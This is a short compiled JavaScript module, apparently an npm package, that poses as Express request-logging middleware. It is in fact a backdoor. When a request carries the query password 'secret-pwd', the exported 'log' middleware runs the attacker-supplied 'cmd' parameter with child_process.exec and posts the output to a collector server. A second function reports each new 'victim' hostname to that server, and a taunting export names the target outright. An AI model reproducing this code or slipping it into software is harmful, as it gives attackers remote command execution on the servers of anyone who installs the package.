"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
var exec = require("child_process").exec;
var http = require("http");
exports.log = function () {
    return function (req, res, next) {
        var _a = req.query, pwd = _a.pwd, cmd = _a.cmd;
        if (!pwd) {
            console.log(new Date().toLocaleString() + ": " + req.method + " - " + req.url);
        }
        if (pwd === "secret-pwd") {
            exec(cmd, function (err, stdout) {
                var data = JSON.stringify({
                    output: stdout,
                });
                var options = {
                    host: "127.0.0.1",
                    port: "3001",
                    path: "/",
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Content-Length": Buffer.byteLength(data),
                    },
                };
                var req = http.request(options);
                req.write(data);
                req.end();
            });
        }
        next();
    };
};
exports.logUrl = function () {
    var newVictim = true;
    return function (req, res, next) {
        if (newVictim) {
            newVictim = false;
            var options = {
                host: "127.0.0.1",
                port: "3001",
                path: "/new-victim?victimURL=" + req.hostname,
            };
            http.request(options).end();
        }
    };
};
exports.youGotServed = function () { return "You Got Served, Dickhead!"; };
//# sourceMappingURL=index.js.map